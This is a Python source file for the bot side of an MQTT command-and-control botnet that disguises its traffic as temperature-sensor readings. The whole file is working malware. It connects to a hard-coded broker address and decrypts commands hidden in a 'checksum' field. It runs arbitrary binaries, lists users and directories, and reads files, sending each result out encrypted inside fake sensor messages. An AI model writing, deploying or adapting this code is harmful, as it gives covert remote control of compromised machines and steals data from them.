#!/usr/bin/env python3
"""
MQTT C&C Bot - Infected Machine Component
Disguised as an IoT temperature sensor
"""

import paho.mqtt.client as mqtt
import json
import base64
import subprocess
import os
import time
import hashlib
from datetime import datetime
from cryptography.fernet import Fernet

# Configuration
BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
BOT_ID = hashlib.md5(os.urandom(8)).hexdigest()[:8]

# Fixed Fernet key (must be same in controller)
ENCRYPTION_KEY = b'8PxL4MZQDq_1jKvN3wYbR5tG7hC2sF9mX6nB0pA4eU8='

class StealthBot:
	def __init__(self):
		self.client = mqtt.Client(client_id=f"sensor_temp_{BOT_ID}")
		self.cipher = Fernet(ENCRYPTION_KEY)
		self.running = True

	def encrypt_data(self, data):
		"""Encrypt data payload"""
		return self.cipher.encrypt(data.encode()).decode()

	def decrypt_data(self, data):
		"""Decrypt data payload"""
		try:
			return self.cipher.decrypt(data.encode()).decode()
		except:
			return None

	def execute_command(self, cmd_type, params):
		"""Execute bot commands"""
		try:
			if cmd_type == "announce":
				return f"Bot {BOT_ID} online"

			elif cmd_type == "users":
				result = subprocess.check_output(['w'], text=True)
				return result

			elif cmd_type == "ls":
				directory = params.get('dir', '.')
				result = subprocess.check_output(['ls', '-la', directory], text=True)
				return result

			elif cmd_type == "whoami":
				result = subprocess.check_output(['id'], text=True)
				return result

			elif cmd_type == "getfile":
				filepath = params.get('path', '')
				if os.path.exists(filepath):
					with open(filepath, 'rb') as f:
						content = base64.b64encode(f.read()).decode()
					return content
				return "File not found"

			elif cmd_type == "exec":
				binary = params.get('bin', '')
				result = subprocess.check_output(binary.split(), text=True)
				return result

		except Exception as e:
			return f"Error: {str(e)}"

	def create_sensor_message(self, cmd_result=None, target_bot=None):
		"""Create disguised sensor message"""
		msg = {
			"device_id": f"sensor_temp_{BOT_ID}",
			"timestamp": int(time.time()),
			"temperature": round(20 + (hash(BOT_ID) % 10), 2),
			"humidity": round(50 + (hash(BOT_ID) % 30), 2),
			"battery": 75 + (hash(BOT_ID) % 25),
			"status": "normal"
		}

		if cmd_result:
			# Hide response in checksum field
			msg["checksum"] = self.encrypt_data(json.dumps({
				"bot_id": BOT_ID,
				"result": cmd_result
			}))

		return msg

	def on_message(self, client, userdata, msg):
		"""Handle incoming MQTT messages"""
		try:
			data = json.loads(msg.payload.decode())

			# Check if message has encrypted command
			if "checksum" in data and data.get("status") == "calibrating":
				encrypted_cmd = data["checksum"]
				cmd_data = self.decrypt_data(encrypted_cmd)

				if cmd_data:
					cmd_json = json.loads(cmd_data)
					target = cmd_json.get("target", "all")

					# Check if command is for this bot or all bots
					if target == "all" or target == BOT_ID:
						cmd_type = cmd_json.get("cmd")
						params = cmd_json.get("params", {})

						# Execute command
						result = self.execute_command(cmd_type, params)

						# Send response
						response = self.create_sensor_message(cmd_result=result)
						self.client.publish(TOPIC, json.dumps(response))
		except:
			pass  # Ignore malformed messages

	def on_connect(self, client, userdata, flags, rc):
		"""Handle connection to broker"""
		print(f"[+] Bot {BOT_ID} connected to broker")
		client.subscribe(TOPIC)

		# Send initial "sensor reading"
		initial_msg = self.create_sensor_message()
		client.publish(TOPIC, json.dumps(initial_msg))

	def run(self):
		"""Start the bot"""
		self.client.on_connect = self.on_connect
		self.client.on_message = self.on_message

		try:
			self.client.connect(BROKER, PORT, 60)
			self.client.loop_forever()
		except KeyboardInterrupt:
			print("\n[!] Bot shutting down")
			self.client.disconnect()


if __name__ == "__main__":
	print(f"[*] Starting stealth bot {BOT_ID}")
	bot = StealthBot()
	bot.run()